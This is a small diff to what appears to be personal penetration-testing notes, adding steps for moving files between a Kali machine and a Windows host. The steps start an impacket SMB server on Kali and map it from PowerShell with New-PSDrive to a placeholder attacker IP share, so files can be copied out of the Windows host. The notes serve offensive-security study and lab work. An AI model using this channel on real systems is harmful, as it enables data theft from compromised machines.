@@ -26,3 +26,12 @@ Turns into 64 bit process
 Check if running 64 bit process
 [Environment]::Is64BitProcess
 
+Move files
+On Kali
+impacket-smbserver Name 'pwd'
+
+On windows in PS
+New-PSDrive -Name "Whatever" -PSProvider "FileSystem" -Root "\\IP\Sharename"
+  now can cd to Whatver
+  can echo files into smb now
+
